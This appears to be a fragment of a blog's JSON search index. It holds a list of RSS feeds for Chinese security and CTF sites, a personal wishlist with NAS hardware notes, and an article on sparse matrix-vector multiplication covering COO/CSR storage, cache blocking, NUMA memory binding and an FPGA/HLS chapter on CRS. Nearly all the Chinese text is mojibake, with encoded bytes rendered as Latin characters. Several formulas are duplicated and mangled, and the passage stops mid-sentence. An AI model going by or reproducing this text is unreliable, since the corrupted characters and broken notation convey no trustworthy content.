çœ‹é›ªç¼–ç¨‹æŠ€æœ¯ï¼šhttps://rsshub.app/pediy/topic/coding/latest çœ‹é›ªäºŒè¿›åˆ¶æ¼æ´ï¼šhttps://rsshub.app/pediy/topic/vuln/latest å…ˆçŸ¥ï¼ˆé˜¿é‡Œäº‘ï¼‰ï¼š https://xz.aliyun.com/feed  xxshangyx Instagramï¼š https://rss.app/feeds/kM793aE1OC39tJXw.xml  ctftimeï¼šhttps://ctftime.org/event/list/upcoming/rss/  weiboï¼šringzeroï¼šhttps://rsshub.app/weibo/user/1859213130  ç¦»åˆ«æ­Œï¼š https://www.leavesongs.com/rss.php l3m0nï¼š http://feed.cnblogs.com/blog/u/242399/rss/ LoRexxarï¼š https://lorexxar.cn/atom.xml bendawnagï¼š http://bendawang.site/rss.xml wonderkunï¼š https://blog.wonderkun.cc/atom.xml EVILCOSä½™å¼¦ï¼šhttps://evilcos.me/?feed=rss2 é›¨äº†ä¸ªé›¨ï¼š https://rsshub.app/hexo/yilia/yulegeyu.com           Magic Skill  Magic Parkour Basketball Psychology   --\u003ewish  Piano Hack     Magic Bag Magic House  3Dåœ°ç”»ï¼ˆè§†è§‰é”™è¯¯ï¼‰ å¯†å®¤ å°ä¹¦æˆ¿(with å‘¼å¸ç¯ã€å°é˜³å°ã€èˆ’é€‚çš„æ²™å‘) æƒ³è¦ä¸€é¢æ¸å˜è‰²çš„é£æ™¯ (æœ‰å¯èƒ½çš„è¯ï¼Œæƒ³è¦ä¸ªå¤å¼æ¥¼) æ°´æ»´å€’æµï¼ˆæƒŠå¤©é­”ç›—å›¢2ï¼Œåˆ©ç”¨å…‰å’Œæ°´æµçš„ç›¸å¯¹é€Ÿåº¦ï¼Œå½¢æˆè§†è§‰é”™è¯¯ï¼‰ RainbowSix æ‰‹åŠ çºªå¿µç¢‘è°·æ‰‹åŠ     Magic NAS ä¸»æ¿\n SATA3 \u003e=4 åƒå…†ç½‘å¡  å†…å­˜æ¡ï¼š8G\nç¨³å®šæ€§ç”µæºï¼š200-400Wï¼Œå¥½çš„1Uç”µæº\nç”µæºï¼š40w*25h = 1åº¦ç”µè´¹\n1åº¦= 1000w * h â‰ˆ 0.45å…ƒ\nMagic  å¿ƒç†å­¦ï¼Œå¦‚æ³¨æ„åŠ›è½¬ç§» ç‰©ç†ç°è±¡ï¼Œå¦‚ç›¸å¯¹é€Ÿåº¦ è§†è§‰é”™è¯¯  ","description":"It is Magic.","tags":[],"title":"Magic","uri":"/posts/magic/"},{"categories":["algorithm"],"content":"ç¨€ç–çŸ©é˜µå‘é‡ä¹˜  æœ¬æ–‡å‚è€ƒ:\nFPGAçŸ©é˜µè®¡ç®—å¹¶è¡Œç®—æ³•ä¸ç»“æ„(çŸ¥ç½‘)\nç¨€ç–çŸ©é˜µå‘é‡ä¹˜æ³•xFPGA\nç¨€ç–çŸ©é˜µå‘é‡ä¹˜æ³•xå¹¶è¡Œç¼–ç¨‹æ–¹æ³•\nç¨€ç–çŸ©é˜µå­˜å‚¨æ ¼å¼æ€»ç»“\næ·±åº¦å­¦ä¹ FPGAåŠ é€Ÿå™¨è®¾è®¡\n åœ¨çŸ©é˜µä¸­ï¼Œè‹¥æ•°å€¼ä¸º0çš„å…ƒç´ æ•°ç›®è¿œè¿œå¤šäºé0å…ƒç´ çš„æ•°ç›®ï¼Œå¹¶ä¸”é0å…ƒç´ åˆ†å¸ƒæ²¡æœ‰è§„å¾‹æ—¶ï¼Œåˆ™ç§°è¯¥çŸ©é˜µä¸ºç¨€ç–çŸ©é˜µï¼›ä¸ä¹‹ç›¸åï¼Œè‹¥é0å…ƒç´ æ•°ç›®å å¤§å¤šæ•°æ—¶ï¼Œåˆ™ç§°è¯¥çŸ©é˜µä¸ºç¨ å¯†çŸ©é˜µã€‚å®šä¹‰éé›¶å…ƒç´ çš„æ€»æ•°æ¯”ä¸ŠçŸ©é˜µæ‰€æœ‰å…ƒç´ çš„æ€»æ•°ä¸ºçŸ©é˜µçš„ç¨ å¯†åº¦ã€‚ SpMVå³ Sparse Matrix Vector Multiplication\nç¨€ç–çŸ©é˜µå‘é‡ä¹˜æ³•çš„ä¼˜åŒ– ç¨€ç–çŸ©é˜µå‘é‡ä¹˜æ³•ï¼ˆSPMVï¼‰å¯åœ¨å¾ˆå¤šæƒ…å†µä¸‹ä»£æ›¿ç¨ å¯†çŸ©é˜µè¿ç®—ï¼Œå¯ä»¥å¤§é‡èŠ‚çœå†…å­˜å ç”¨ï¼Œå‡å°‘è®¡ç®—å¼€é”€ã€‚çŸ©é˜µå‘é‡ä¹˜æ³•ä¸åŒäºçŸ©é˜µå’ŒçŸ©é˜µçš„ä¹˜æ³•ï¼Œè¿™æ˜¯å®Œå…¨è®¿å­˜å¯†é›†å‹çš„è®¡ç®—ï¼Œæˆ‘ä»¬ä¸»è¦çš„ä¼˜åŒ–æ–¹å‘æ˜¯æå‡è®¿å­˜æ•ˆç‡æˆ–å‡å°‘è®¿å­˜å¼€é”€ã€‚\nç¨€ç–çŸ©é˜µä¸€èˆ¬åªå­˜å‚¨éé›¶å…ƒçš„ä¿¡æ¯ï¼Œéé›¶å…ƒçš„å­˜å‚¨æ ¼å¼å†³å®šäº†è®¿å­˜çš„æ¨¡å¼ï¼Œè¿™éœ€è¦æ ¹æ®éé›¶å…ƒçš„åˆ†å¸ƒæ¨¡å¼å’Œè¦åšçš„è®¡ç®—ç±»å‹æ¥è®¾è®¡ã€‚æˆ‘ä»¬å‡è®¾åˆ†å¸ƒæ¨¡å¼å¹¶éå¯¹è§’çº¿åˆ†å¸ƒï¼Œæ•´ä½“åˆ†å¸ƒè¾ƒå‡åŒ€ï¼Œå±€éƒ¨å¯èƒ½ä¼šæœ‰èšé›†ï¼Œè®¡ç®—ç±»å‹æ˜¯ç¨€ç–çŸ©é˜µä¹˜ä»¥ç¨ å¯†å‘é‡ï¼Œç»“æœä¸ºç¨ å¯†å‘é‡ã€‚\næ ‡å‡†çš„ç¨€ç–çŸ©é˜µå­˜å‚¨æ ¼å¼ä¸»è¦æœ‰ï¼šCOOï¼ˆCoordinate Formatï¼‰å’ŒCSRï¼ˆCompressed Sparse Rowï¼‰ç­‰ã€‚COOå¾ˆç®€å•ï¼Œå°±æ˜¯ä½¿ç”¨3ä¸ªæ•°ç»„ï¼Œåˆ†åˆ«å­˜å‚¨å…¨éƒ¨éé›¶å…ƒçš„è¡Œä¸‹æ ‡ï¼ˆrow indexï¼‰ã€åˆ—ä¸‹æ ‡ï¼ˆcolumn indexï¼‰å’Œå€¼ï¼ˆvalueï¼‰ï¼›CSRç¨å¤æ‚ï¼Œå¯¹è¡Œä¸‹æ ‡è¿›è¡Œäº†å‹ç¼©ï¼Œå‡è®¾çŸ©é˜µè¡Œæ•°æ˜¯mï¼Œåˆ™å‹ç¼©åçš„æ•°ç»„é•¿åº¦ä¸ºm+1ï¼Œè®°ä½œï¼ˆrow ptrï¼‰ï¼Œå…¶ä¸­ç¬¬iä¸ªå…ƒç´ ï¼ˆ0-baseï¼‰è¡¨ç¤ºçŸ©é˜µå‰iè¡Œçš„éé›¶å…ƒä¸ªæ•°ã€‚\nå›¾1-1å’Œå›¾1-2å±•ç¤ºäº†COOå’ŒCSRæ ¼å¼å­˜å‚¨ç¨€ç–çŸ©é˜µçš„ä¸€ä¸ªä¾‹å­ã€‚\n\næˆ‘ä»¬æ¥è€ƒè™‘çŸ©é˜µå‘é‡ä¹˜æ³•è®¡ç®—y=Axï¼Œå…¶ä¸­Aæ˜¯ç¨€ç–çŸ©é˜µï¼Œç»´åº¦æ˜¯må’Œnï¼Œéé›¶å…ƒä¸ªæ•°æ˜¯kï¼›xå’Œyæ˜¯ç¨ å¯†å‘é‡ï¼Œç»´åº¦åˆ†åˆ«æ˜¯nå’Œmï¼ŒmÃ—n \u003e\u003e k \u003e\u003e max(m, n)ã€‚åšè¿™ä¸ªç¨€ç–çŸ©é˜µå‘é‡ä¹˜æ³•å°±è¦éå†Açš„æ¯ä¸€è¡Œï¼Œå’Œxå¯¹åº”ä½ç½®ç›¸ä¹˜ï¼ŒæŠŠç»“æœç´¯åŠ åˆ°yçš„å¯¹åº”ä½ç½®ã€‚è¿™ä¸ªè¿‡ç¨‹å¯¹Açš„kä¸ªéé›¶å…ƒå…¨éƒ¨è®¿é—®äº†ä¸€éï¼Œå¯¹xä¹Ÿè®¿é—®äº†kä¸ªå…ƒç´ ï¼ˆé‡å ï¼‰ï¼Œå¯¹yè®¿é—®äº†ä¸€éï¼Œæ‰€ä»¥ä¼˜åŒ–é‡ç‚¹åœ¨äºå‡å°‘è®¿é—®Açš„å†—ä½™ï¼Œå¹¶æå‡è®¿é—®xçš„æ•ˆç‡ã€‚ä¸‹é¢è¿™å‡ ä¸ªä¼˜åŒ–æ ‡å‡†ç¨€ç–çŸ©é˜µå­˜å‚¨æ ¼å¼çš„æ–¹æ³•ï¼Œå¯ä»¥æå‡è®¿å­˜æ•ˆç‡ï¼Œå‡å°‘å†—ä½™ã€‚\n\nï¼ˆ1ï¼‰å¯¹çŸ©é˜µAåšè¡Œåˆ—åˆ†å—å¤„ç†\nå¯¹xçš„è®¿é—®æ¯æ¬¡æ€»æ˜¯ä»å·¦åˆ°å³è¿›è¡Œç¨€ç–çš„éå†ï¼Œå¦‚æœnå¾ˆå¤§ï¼ˆæ¯”å¦‚ä¸Šç™¾ä¸‡ç”šè‡³æ›´å¤šï¼‰ï¼Œåˆ™è®¿é—®xçš„ç©ºé—´å±€éƒ¨æ€§è¾ƒå·®ã€‚æ‰€ä»¥æˆ‘ä»¬é¦–å…ˆæ”¹è¿›çŸ©é˜µAçš„è®¿é—®é¡ºåºï¼Œå°†çŸ©é˜µAåˆ†è§£æˆå¤šä¸ªæ–¹å½¢çš„å­çŸ©é˜µã€‚å­çŸ©é˜µçš„ç»´åº¦é€‚åº”è¾ƒé«˜å±‚CPUç¡¬ä»¶cacheçš„å¤§å°ï¼Œè¿™æ ·åœ¨éå†æ¯ä¸€ä¸ªå­çŸ©é˜µæ—¶ï¼Œå¯¹xçš„è®¿é—®ç›¸å¯¹é›†ä¸­äºä¸€ä¸ªè¾ƒå°çš„åŒºé—´ï¼Œè¿™ä¸ªåŒºé—´å†…çš„xä¼šè¢«cacheç¼“å­˜ï¼Œè¿™æ ·èƒ½å¤Ÿå¤§å¤§æé«˜è®¿é—®æ•ˆç‡ã€‚åˆ†å—æ–¹å¼å¦‚å›¾1-3æ‰€ç¤ºã€‚\n\nï¼ˆ2ï¼‰è‡ªé€‚åº”åˆ†å—å­˜å‚¨ç»“æ„\nç”±äºç¨€ç–çŸ©é˜µçš„éé›¶å…ƒåˆ†å¸ƒä¸ä¸€å®šå‡åŒ€ï¼Œæœ‰çš„åˆ†å—ä¼šéå¸¸ç¨€ç–ï¼Œæœ‰çš„åˆ™ä¼šç›¸å¯¹ç¨ å¯†ã€‚å¯¹äºæç¨€ç–çš„åˆ†å—ï¼ˆéé›¶å…ƒæ•°é‡è¿œå°äºè¡Œæ•°ï¼‰ï¼Œå¦‚æœç”¨å’ŒCSRç›¸ä¼¼çš„å‹ç¼©è¡Œå­˜å‚¨ç­–ç•¥ï¼Œåˆ™ä¼šæµªè´¹ç©ºé—´ï¼Œæ‰€ä»¥ç”¨COOçš„æ–¹å¼åè€Œæ›´èƒ½èŠ‚çœå­˜å‚¨ç©ºé—´ï¼Œæé«˜è®¿é—®æ•ˆç‡ã€‚\nå¯¹äºå“ªäº›åˆ†å—ä½¿ç”¨CSRï¼Œå“ªäº›ä½¿ç”¨COOæ–¹å¼ï¼Œå¯ä»¥é€šè¿‡å®éªŒçš„æ–¹å¼ç¡®å®šä¸€ä¸ªéé›¶å…ƒçš„æ•°é‡å’Œåˆ†å—å¤§å°çš„æ¯”å€¼ã€‚é«˜äºè¯¥å€¼çš„ç”¨CSRæ–¹å¼å­˜å‚¨ï¼Œå¦åˆ™ç”¨COOæ–¹å¼å­˜å‚¨ã€‚\nå¦‚å›¾1-4æ‰€ç¤ºï¼Œä¸€å…±ä½¿ç”¨5ä¸ªæ•°ç»„å­˜å‚¨è‡ªé€‚åº”åˆ†å—ä¿¡æ¯çš„ç¨€ç–çŸ©é˜µï¼Œç°è‰²çš„éƒ¨åˆ†æ˜¯CSRçš„ç›¸å…³ä¿¡æ¯ï¼Œç™½è‰²çš„éƒ¨åˆ†æ˜¯COOçš„ç›¸å…³ä¿¡æ¯ã€‚col_idxå’Œvalsçš„æ„ä¹‰ä¸å˜ï¼›typeså­˜å‚¨åˆ†å—ç±»å‹ï¼Œæ ‡è¯†å½“å‰åˆ†å—æ˜¯CSRè¿˜æ˜¯COOï¼›å¦‚æœå½“å‰åˆ†å—æ˜¯CSRï¼Œåˆ™row_infoå­˜å‚¨ç±»ä¼¼row_ptrçš„ä¿¡æ¯ï¼ˆç¬¬kä¸ªå…ƒç´ è¡¨ç¤ºåˆ†å—å†…ç¬¬kè¡Œçš„éé›¶å…ƒä¸ªæ•°ï¼‰ï¼Œå¦åˆ™å­˜å‚¨COOçš„row_idxçš„ä¿¡æ¯ï¼›row_idå­˜å‚¨æ¯ä¸ªåˆ†å—åœ¨row_infoä¸Šçš„èµ·å§‹åœ°å€ã€‚\n\nï¼ˆ3ï¼‰å‡å°‘ä¸‹æ ‡å­˜å‚¨çš„å†—ä½™\nçŸ©é˜µåˆ†å—åï¼Œåˆ†å—å†…é—´å€çš„ä¸‹æ ‡å¹¶ä¸éœ€è¦4å­—èŠ‚intå‹æ•´æ•°å­˜å‚¨ï¼Œæ¯”å¦‚åˆ†å—ç»´åº¦åœ¨64Kä»¥å†…ï¼Œå¯ä»¥ç”¨2å­—èŠ‚çš„unsigned shortæ¥å­˜å‚¨ã€‚è¿™æ ·ï¼Œæ— è®ºæ˜¯CSRæˆ–COOçš„row_idxã€row_ptrï¼Œè¿˜æ˜¯col_idxï¼Œéƒ½å¯ä»¥å‡å°‘50%çš„å­˜å‚¨ç©ºé—´ï¼Œå¹¶åŒæ—¶æå‡è®¿å­˜æ•ˆç‡ã€‚\nï¼ˆ4ï¼‰å¤šçº¿ç¨‹å’ŒNUMAç‰¹æ€§\nå•å¤„ç†å™¨å¤šæ ¸å¤šçº¿ç¨‹å¹¶è¡Œè®¡ç®—ç¨€ç–çŸ©é˜µå‘é‡ä¹˜çš„è¿‡ç¨‹æ¯”è¾ƒç®€å•ï¼Œåªéœ€æŠŠçŸ©é˜µåˆ’åˆ†æˆçº¿ç¨‹æ•°é‡çš„å­çŸ©é˜µã€‚è¿™é‡Œé‡‡ç”¨æ¨ªåˆ‡çš„æ–¹æ³•ï¼Œè®¡ç®—ç»“æœä¸ç”¨åˆå¹¶ã€‚\nä½†æ˜¯å¯¹äºå¤šå¤„ç†å™¨éä¸€è‡´å†…å­˜è®¿é—®ï¼ˆNUMAï¼‰ï¼Œå°±éœ€è¦å¯¹æ•°æ®åœ¨å†…å­˜ä¸­çš„åˆ†å¸ƒåšç‰¹æ®Šå¤„ç†ï¼Œæ‰èƒ½æœ€å¤§ç¨‹åº¦åœ°åˆ©ç”¨å…¨éƒ¨çš„å†…å­˜å¸¦å®½ã€‚\nä¸€ä¸ªå…¸å‹çš„Intel X86åŒè·¯æœåŠ¡å™¨çš„æ‹“æ‰‘æ¶æ„å¦‚å›¾1-5æ‰€ç¤ºã€‚\nMemory #0æ˜¯CPU #0çš„æœ¬åœ°å†…å­˜ï¼ŒMemory #1æ˜¯CPU #1çš„æœ¬åœ°å†…å­˜ï¼Œå®ƒä»¬æœ‰å„è‡ªç‹¬ç«‹çš„å†…å­˜å¸¦å®½ã€‚CPU #0è®¿é—®Memory #1éœ€è¦ç»è¿‡å†…éƒ¨æ€»çº¿ï¼ˆåœ¨Intelçš„æ¶æ„ä¸­å«QPIæ€»çº¿ï¼‰ï¼Œè¿™ä¸ªæ€»çº¿çš„å¸¦å®½ä¸€èˆ¬å°äºå†…å­˜å¸¦å®½ã€‚å¦å¤–å¦‚æœè¦è®¿é—®çš„æ•°æ®åªé›†ä¸­åœ¨ä¸€é¢—CPUçš„æœ¬åœ°å†…å­˜ä¸­ï¼Œé‚£ä¹ˆåªèƒ½åˆ©ç”¨ä¸€ä¸ªNUMA nodeçš„å†…å­˜å¸¦å®½ï¼Œè¿™å°±é™åˆ¶äº†ç³»ç»Ÿçš„æ€»ä½“ååã€‚\næ‰€ä»¥éœ€è¦æŠŠç¨€ç–çŸ©é˜µçš„å­˜å‚¨å‡åŒ€åœ°åˆ†é…åˆ°ä¸¤é¢—å¤„ç†å™¨å„è‡ªçš„æœ¬åœ°å†…å­˜ä¸­ã€‚å¯¹äºä¸€ä¸ªåŒCPUï¼Œæ¯é¢—CPUä¸€å…±4æ ¸çš„ç³»ç»Ÿï¼Œéœ€è¦å¼€8ä¸ªçº¿ç¨‹ï¼Œå¹¶æŠŠè¿™8ä¸ªçº¿ç¨‹åˆ†åˆ«ç»‘å®šåˆ°8é¢—CPUæ ¸ä¸Šï¼Œä½¿çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ä¸ä¼šåœ¨æ ¸é—´è¿ç§»ã€‚å¯¹äºæ¯ä¸ªçº¿ç¨‹è¦å¤„ç†çš„ç¨€ç–çŸ©é˜µæ•°æ®ï¼Œä¹Ÿé€šè¿‡ç³»ç»Ÿè°ƒç”¨ï¼ˆåœ¨Linuxä¸­æ˜¯mbindï¼‰ï¼Œç»‘å®šåˆ°æ‰€åœ¨CPUæ ¸çš„æœ¬åœ°å†…å­˜ä¸­ã€‚è¿™æ ·æ¯ä¸ªæ ¸å¤„ç†çš„æ•°æ®ä¸€å®šæ˜¯ä»æœ¬åœ°å†…å­˜ä¸­è·å¾—çš„ï¼Œä¸ä¼šç»è¿‡QPIæ€»çº¿ã€‚è¿™å°±æœ€å¤§ç¨‹åº¦åœ°åˆ©ç”¨äº†ç³»ç»Ÿå†…å­˜çš„å¸¦å®½ã€‚ç»è¿‡å®æµ‹ï¼Œè¿™ä¸ªä¼˜åŒ–æ–¹æ³•å¯ä»¥æå‡70%å·¦å³çš„å†…å­˜å¸¦å®½ã€‚\n\nå¯¹äºæˆ‘ä»¬æµ‹è¯•çš„ä¸€ä¸ªç»´åº¦å¤§çº¦1Mã€ç¨€ç–åº¦0.0001çš„ç¨€ç–çŸ©é˜µæ¥è¯´ï¼Œæ‰€æœ‰ä¼˜åŒ–åŠ èµ·æ¥ï¼Œç›¸å¯¹Intel MKLåº“ä¸­CSRçŸ©é˜µçš„SpMV APIåŠ é€Ÿäº†2.5xå·¦å³ã€‚å­¦æœ¯ç•Œè¿˜æœ‰å¾ˆå¤šé’ˆå¯¹ç¨€ç–çŸ©é˜µå­˜å‚¨æ ¼å¼çš„è®¨è®ºå’Œç ”ç©¶ï¼Œå…¶ä¸­æœ‰äº›è¿˜åˆ©ç”¨äº†SIMDå‘é‡æŒ‡ä»¤ï¼Œè¿™é‡Œä»‹ç»çš„ç¨€ç–çŸ©é˜µä¹˜æ³•æ–¹æ³•ï¼Œæ›´å¤šæ˜¯ä¸ºäº†è®¨è®ºå†…å­˜å’Œcacheä¼˜åŒ–çš„ä¸€äº›åŸºæœ¬åŸç†ã€‚ç¨€ç–çŸ©é˜µæ ¹æ®ç¨€ç–åº¦å’Œéé›¶å…ƒåˆ†å¸ƒçš„ä¸åŒï¼Œéœ€è¦ä½¿ç”¨ä¸åŒçš„å­˜å‚¨ç­–ç•¥ï¼Œæ‰€ä»¥é‡åˆ°å®é™…çš„ç¨€ç–çŸ©é˜µé—®é¢˜ï¼Œéœ€è¦æ ¹æ®å®é™…æƒ…å†µå¼€å‘ä¸åŒçš„å­˜å‚¨æ ¼å¼ã€‚\nFPGAä¸Šçš„ç¨€ç–çŸ©é˜µå‘é‡ä¹˜ç¨€ç–çŸ©é˜µå‘é‡ä¹˜æ³• ç¨€ç–çŸ©é˜µå‘é‡ä¹˜ï¼ˆSpMVï¼‰æŠŠä¸€ä¸ªç¨€ç–çŸ©é˜µä¸ä¸€ä¸ªå‘é‡ç›¸ä¹˜ã€‚ç¨€ç–çŸ©é˜µæ˜¯æŒ‡çŸ©é˜µä¸­å¤§éƒ¨åˆ†å…ƒç´ ä¸º0çš„çŸ©é˜µã€‚è¿™é‡Œçš„å‘é‡æœ¬èº«ä¹Ÿå¯æ˜¯ç¨€ç–çš„ï¼Œä½†é€šå¸¸æƒ…å†µä¸‹æ˜¯å¯†é›†çš„ã€‚ä½œä¸ºä¸€ç§é€šç”¨çš„è¿ç®—ï¼Œåœ¨ç§‘å­¦åº”ç”¨ã€ç»æµæ¨¡å‹ã€æ•°æ®æŒ–æ˜ã€ä¿¡æ¯æ£€ç´¢ä¸­å¹¿æ³›åº”ç”¨ã€‚ä¾‹å¦‚ï¼Œåœ¨åˆ©ç”¨è¿­ä»£æ³•æ±‚è§£ç¨€ç–çº¿æ€§æ–¹ç¨‹ç»„å’Œç‰¹å¾å€¼çš„é—®é¢˜ã€‚åŒæ—¶ï¼Œä¹Ÿè¢«åº”ç”¨äºç½‘é¡µæœç´¢æ’åå’Œè®¡ç®—æœºè§†è§‰ï¼ˆå›¾åƒé‡æ„ç­‰ï¼‰ã€‚\næœ¬ç« ä¼šå¼•å…¥å‡ ä¸ªä¸HLSç›¸å…³çš„æ–°æ¦‚å¿µï¼Œå¹¶è¿›ä¸€æ­¥æ·±å…¥ä¹‹å‰è®¨è®ºè¿‡çš„ä¼˜åŒ–ã€‚æœ¬ç« çš„ç›®æ ‡ä¹‹ä¸€æ˜¯å¼•å…¥ä¸€ç§æ›´å¤æ‚çš„æ•°æ®ç»“æ„ã€‚æˆ‘ä»¬ç”¨å‹ç¼©è¡Œå­˜å‚¨ï¼ˆCRSï¼‰æ¥ä¿å­˜ç¨€ç–çŸ©é˜µã€‚å¦ä¸€ä¸ªç›®æ ‡æ˜¯æ¼”ç¤ºå¦‚ä½•è¿›è¡Œæ€§èƒ½æµ‹è¯•ã€‚æˆ‘ä»¬ç¼–å†™äº†ç®€å•çš„æ¿€åŠ±ç”¨æ¥æ£€éªŒè®¾è®¡æ˜¯å¦æ­£ç¡®ã€‚è¿™åœ¨ç¡¬ä»¶è®¾è®¡ä¸­ååˆ†é‡è¦ï¼ŒVivadoÂ®HLS å·¥å…·é‡‡ç”¨HLS Cç¼–å†™æ¿€åŠ±ï¼Œå¹¶èƒ½è½»æ¾çš„å¯¹å·¥å…·ç”Ÿæˆçš„RTLä»£ç è¿›è¡Œå¤šæ–¹é¢çš„éªŒè¯ã€‚è¿™æ˜¯åŸºäºHLSè®¾è®¡æ¯”åŸºäºRTLè®¾è®¡çš„å·¨å¤§ä¼˜åŠ¿ä¹‹ä¸€ã€‚ç« èŠ‚ä¸­ä¹Ÿä¼šè®²è§£å¦‚ä½•é‡‡ç”¨VivadoÂ®HLSå·¥å…·è¿›è¡ŒC/RTLè”åˆä»¿çœŸã€‚ä¸åŒSpMVè®¾è®¡ä¼šå¸¦æ¥æ€§èƒ½ä¸Šå·®å¼‚ï¼Œå› ä¸ºæ‰§è¡Œæ—¶é—´å’Œç¨€ç–çŸ©é˜µæ˜¯å¯†åˆ‡ç›¸å…³çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»é€šè¿‡è¾“å…¥æ•°æ®æ¥ç¡®å®šä»»åŠ¡æ‰§è¡Œä¹‹é—´çš„é—´éš”ä»¥åŠä»»åŠ¡å»¶è¿Ÿã€‚\n6.1 èƒŒæ™¯ å›¾6.1æ˜¾ç¤ºäº†ä¸€ä¸ª4x4çš„çŸ©é˜µMè¡¨ç¤ºçš„2ç§æ–¹å¼ã€‚å…¶ä¸­å›¾6.1-aé‡‡ç”¨é€šç”¨çš„äºŒç»´æ–¹å¼16ä¸ªå…ƒç´ æ¥è¡¨ç¤ºçŸ©é˜µï¼Œæ¯ä¸ªå…ƒç´ å­˜å‚¨åœ¨è‡ªå·±å¯¹åº”çš„ä½ç½®ä¸Šã€‚å›¾6.1-bé‡‡ç”¨CRSçš„æ–¹å¼è¡¨ç¤ºç›¸åŒçš„çŸ©é˜µã€‚CRS ä½œä¸ºä¸€ç§æ•°æ®ç»“æ„ï¼Œç”±3ä¸ªæ•°ç»„ç»„æˆã€‚å€¼(values)æ•°ç»„ä¿å­˜çŸ©é˜µä¸­éé›¶å…ƒç´ çš„å€¼ã€‚åˆ—ç´¢å¼•(columnIndex)æ•°ç»„å’Œè¡ŒæŒ‡é’ˆï¼ˆrowPtrï¼‰æ•°ç»„å¯¹éé›¶å…ƒç´ çš„ä½ç½®ä¿¡æ¯è¿›è¡Œç¼–ç ã€‚åˆ—ç´¢å¼•å­˜å‚¨æ¯ä¸€åˆ—çš„å…ƒç´ ï¼Œè¡ŒæŒ‡é’ˆåŒ…å«æ¯ä¸€è¡Œç¬¬ä¸€ä¸ªå…ƒç´ çš„å€¼ã€‚CRS ç»“æ„é¿å…å­˜å‚¨çŸ©é˜µä¸­çš„0å€¼ï¼Œç¡®å®åœ¨æ•°å€¼æ•°ç»„ä¸­ç¡®å®æ²¡æœ‰å­˜å‚¨0ã€‚ä½†æ˜¯åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œè™½ç„¶æ•°å€¼æ•°ç»„ä¸ä¿å­˜0ï¼Œä½†æ˜¯åˆ—ç´¢å¼•æ•°ç»„å’Œè¡ŒæŒ‡é’ˆæ•°ç»„ä½œä¸ºæ ‡è®°ä¿¡æ¯ï¼Œè¡¨ç¤ºäº†çŸ©é˜µçš„å½¢æ€ã€‚CRS å¹¿æ³›ç”¨äºå¤§å‹çš„çŸ©é˜µä½†æ˜¯ä»…ä»…æœ‰å°‘é‡çš„éé›¶å…ƒç´ ï¼ˆå°‘äº10%æˆ–è€…æ›´ä½ï¼‰ï¼Œè¿™æ ·å¯ä»¥ç®€åŒ–è¿™ç±»çŸ©é˜µçš„å­˜å‚¨ä»¥åŠç›¸å…³çš„è¿ç®—ã€‚\nå›¾ 6.1: Mæ˜¯ä¸€ä¸ª4x4çŸ©é˜µï¼Œç”¨ä¸¤ç§æ–¹å¼è¡¨ç¤ºï¼šåŒ\"å¯†é›†\"çŸ©é˜µä¸€æ ·å­˜åœ¨äºŒç»´æ•°ç»„ä¹‹ä¸­ï¼›ä½œä¸ºç¨€ç–çŸ©é˜µï¼Œä»¥è¡Œå‹ç¼©å­˜å‚¨çš„å½¢å¼ä¿å­˜ï¼Œè¡Œå‹ç¼©å­˜å‚¨æ˜¯ä¸€ç§ç”±3ä¸ªæ•°ç»„ç»„æˆçš„æ•°æ®ç»“æ„ã€‚\nä½†æ˜¯ï¼ŒCRSå¯¹çŸ©é˜µçš„ç¨€ç–æ€§æ²¡æœ‰è¦æ±‚ï¼Œå¯ä»¥é€‚ç”¨äºä»»ä½•çŸ©é˜µã€‚ä½œä¸ºä¸€ç§é’ˆå¯¹çŸ©é˜µçš„é€šç”¨æ–¹æ³•ï¼Œä½†ä¸è§å¾—æ˜¯æœ€é«˜æ•ˆçš„ã€‚CRSç»“æ„ä¹Ÿä¸è§å¾—æ˜¯è¡¨ç¤ºç¨€ç–çŸ©é˜µæœ€é«˜æ•ˆçš„æ–¹å¼ï¼Œå…¶ä»–ç¨€ç–çŸ©é˜µè¡¨ç¤ºæ–¹æ³•ä¹Ÿåœ¨è¢«ä½¿ç”¨ã€‚\næ›´å‡†ç¡®çš„è®²ï¼ŒCRSä½œä¸ºä¸€ç§æ•°æ®ç»“æ„ç”±3ä¸ªæ•°ç»„æ„æˆï¼šå€¼(values)ã€åˆ—ç´¢å¼•(colIndex)ã€è¡Œç´¢å¼•ï¼ˆrowPtrï¼‰ã€‚å€¼æ•°ç»„å’Œåˆ—ç´¢å¼•è¡¨ç¤ºç¨€ç–çŸ©é˜µMä¸­çš„æ¯ä¸€ä¸ªéé›¶å…ƒç´ ï¼Œè¿™äº›æ•°ç»„è¡¨ç¤ºçŸ©é˜µMé‡‡ç”¨è¡Œçš„æ–¹å¼ï¼Œä»å·¦åˆ°å³ï¼Œä»ä¸Šåˆ°ä¸‹ã€‚çŸ©é˜µä¸­çš„æ•°æ®ä¿å­˜åœ¨å€¼æ•°ç»„ä¸­ï¼Œåˆ—ç´¢å¼•æ•°ç»„ä¿å­˜æ•°æ®åœ¨æ•°ç»„ä¸­æ°´å¹³æ–¹å‘çš„ä½ç½®ï¼Œå¦‚æœ values[k] è¡¨ç¤º M_{ij}*M**i**j* å…¶ä¸­collndex[k]= j*c**o**l**l**n**d**e**x*[*k*]=*j*ã€‚æ•°ç»„**rowPtr**ç”¨n+1*n*+1çš„é•¿åº¦æ¥è¡¨ç¤ºnè¡ŒçŸ©é˜µã€‚**rowPtr[k]** è¡¨ç¤ºåœ¨è¡Œkä¹‹å‰ï¼ŒçŸ©é˜µä¸­æ‰€æœ‰å…ƒç´ çš„æ•°ç›®ï¼Œå…¶ä¸­rowPtr[0]=0*r**o**w**P**t**r*[0]=0ä¸”æœ€åä¸€ä¸ªå…ƒç´ **rowPtr[k]** æ€»æ˜¯è¡¨ç¤ºå½“å‰çŸ©é˜µkè¡Œä¹‹å‰æ‰€æœ‰éé›¶å…ƒç´ çš„ä¸ªæ•°M_{ij}*M**i**j* ,å…¶ä¸­rowPtr[i] \\leq k \\leq rowPtr[i+1]*r**o**w**P**t**r*[*i*]â‰¤*k*â‰¤*r**o**w**P**t**r*[*i*+1]ã€‚å¦‚æœè¡ŒkåŒ…å«ä»»ä½•é0å…ƒç´ ï¼Œé‚£ä¹ˆ**rowPtr[k]** å°†åŒ…å«å½“å‰è¡Œçš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚æ³¨æ„ï¼Œå¦‚æœå½“å‰è¡Œæ²¡æœ‰é0å…ƒç´ ï¼Œé‚£ä¹ˆ **rowPtr** 